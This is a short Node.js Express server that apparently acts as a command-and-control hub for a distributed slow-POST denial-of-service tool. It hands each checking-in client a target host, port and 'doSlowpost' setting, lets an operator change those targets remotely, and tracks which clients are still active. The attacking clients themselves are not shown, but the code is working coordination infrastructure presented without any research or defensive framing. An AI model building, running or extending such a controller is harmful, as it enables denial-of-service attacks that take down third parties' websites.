const express = require('express');
const got = require('got');
const level = require('level');

const db = level('db');
const app = express();

const baseConfig = {doTLS: true, doSlowpost: true, host: "", port: 443, path: "/", method: "POST"};

app.use(express.json());
app.use(express.static('public/'));

app.get('/xhr', async (_, res) => {
  res.json(JSON.parse(await db.get('reports')));
});

app.get('/config', async (_, res) => {
  res.json(baseConfig);
});

app.get('/configs', async (_, res) => {
  res.json(JSON.parse(await db.get('configs')));
});

app.post('/configs/:id', async (req, res) => {
  const origConf = JSON.parse(await db.get('configs'));
  origConf[req.params.id] = req.body;
  await db.put('configs', JSON.stringify(origConf));
  res.sendStatus(200);
});

// app.get('/check', async (req, res) => {
//   const conf = JSON.parse(await db.get('configs'));
//   try {
//     await got(`http${conf.doTLS ? 's' : ''}://${conf.host}:${conf.port}`);
//     res.send('true');
//   } catch (e) {
//     res.send('false');
//   }
// });

app.post('/update/:id', async (req, res) => {
  const origUpd = JSON.parse(await db.get('updates'));
  await db.put('updates', JSON.stringify(Object.assign(origUpd, { [req.params.id]: new Date().getTime() })));

  const origConf = JSON.parse(await db.get('configs'));
  if (!Object.hasOwnProperty.call(origConf, req.params.id)) {
    origConf[req.params.id] = baseConfig;
    await db.put('configs', JSON.stringify(origConf));
  }
  
  const orig = JSON.parse(await db.get('reports'));
  orig[req.params.id] = req.body;
  await db.put('reports', JSON.stringify(orig));
  res.json(origConf[req.params.id]);
});

db.batch()
.put('reports', '{}')
.put('configs', '{}')
.put('updates', '{}').write((err) => {
  if (err) return console.error('fatal: couldn\'t write to db');

  setInterval(() => (async () => {
    const updates = JSON.parse(await db.get('updates'));
    for (const key in updates) {
      if (Object.hasOwnProperty.call(updates, key)) {
        if (new Date().getTime() - updates[key] > 10000) {
          const orig = JSON.parse(await db.get('reports'));
          delete orig[key];
          await db.put('reports', JSON.stringify(orig));
        }
      }
    }
  })().catch(e => console.error(e)), 2000);

  app.listen(8000, () => {
    console.log('init: listening');
  });
});
